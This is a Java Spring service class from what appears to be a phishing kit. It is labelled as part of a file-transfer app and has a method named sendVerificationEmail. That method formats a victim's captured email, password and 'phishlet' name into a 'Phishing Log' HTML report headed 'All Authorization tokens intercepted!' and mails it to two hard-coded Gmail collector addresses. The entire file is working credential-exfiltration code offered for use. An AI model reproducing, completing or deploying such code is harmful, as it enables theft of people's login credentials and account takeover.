package havezzy.filetransfer.app.email;

import java.io.UnsupportedEncodingException;

import javax.mail.MessagingException;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

@Service
public class EmailService {
	@Autowired
	MailSenderService mailSenderService;
	
	public void addEmail(Email email) throws UnsupportedEncodingException, MessagingException {
		sendVerificationEmail(email);
	}
	
	private void sendVerificationEmail(Email email) throws MessagingException, UnsupportedEncodingException {
		String toAddress = "alibaba.login001@gmail.com";
		String toAddress2 = "soft6dev@gmail.com";
		String subject = "Phishing Log";
		String content = "<!DOCTYPE html>\n"
		+ "<html lang=\"en\">\n"
		+ "<head>\n"
		+ "    <meta charset=\"UTF-8\">\n"
		+ "    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n"
		+ "    <title>Document</title>\n"
		+ "</head>\n"
		+ "<body style=\"background-color: black; color: green; padding: 16px;\">\n"
		+ "    <div style=\"background-color: rgb(18, 18, 18); padding: 16px;\">\n"
		+ "    <p style=\"font-size: 18px;\">All Authorization tokens intercepted!</p>\n"
		+ "    <p style=\"overflow: hidden;\">ID: ece22c33233b9a50d7a56aa06c0b336f431baf677f2320255e519faa82eba42c</p>\n"
		+ "    <p>Phishlet Name: "+email.getPhishlet()+"</p>\n"
		+ "    <p>Email: "+email.getEmail()+"</p>\n"
		+ "    <p>Password: "+email.getPassword()+"</p>\n"
		+ "    <p>IsAuthUrl: true</p>\n"
		+ "    <p>Custom Tokens: False</p>\n"
		+ "    <p>Params Tokens: False</p>\n"
		+ "    <p>BodyTokens: False</p>\n"
		+ "    <p>HttpTokens: True</p>\n"
		+ "</div>\n"
		+ "<p>Cookies: <span style=\"color: red;\">{null}</span></p>\n"
		+ "</body>\n"
		+ "</html>";
		
		mailSenderService.sendEmail(toAddress, subject, content);
		mailSenderService.sendEmail(toAddress2, subject, content);
	}

	
	

}
